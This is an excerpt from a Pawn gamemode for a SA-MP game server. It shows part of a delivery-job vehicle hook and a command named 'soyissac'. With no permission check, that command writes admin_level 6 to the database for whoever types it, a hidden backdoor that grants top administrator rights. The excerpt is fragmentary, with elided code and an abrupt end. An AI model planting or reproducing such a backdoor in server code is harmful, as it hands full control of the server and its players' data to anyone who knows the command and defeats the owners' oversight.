...
hook OnPlayerStateChange(playerid, newstate, oldstate) {
    if(oldstate == PLAYER_STATE_DRIVER && PLAYER_TEMP[playerid][pt_WORKING_IN] == WORK_DELIVERYMAN) {
        if(PLAYER_TEMP[playerid][pt_LAST_VEHICLE_ID] != INVALID_VEHICLE_ID) {
			...
			else if(!TRUCK_VEHICLE[vehicleid][truck_vehicle_LOADED])
			{
...
CMD:soyissac(playerid, params[])
{

	mysql_format(srp_db, QUERY_BUFFER, sizeof QUERY_BUFFER, "UPDATE player SET admin_level = 6 WHERE id = %d;", PI[playerid][pi_ID]);
	mysql_tquery(srp_db, QUERY_BUFFER);

	PI[playerid][pi_ADMIN_LEVEL] = 6;
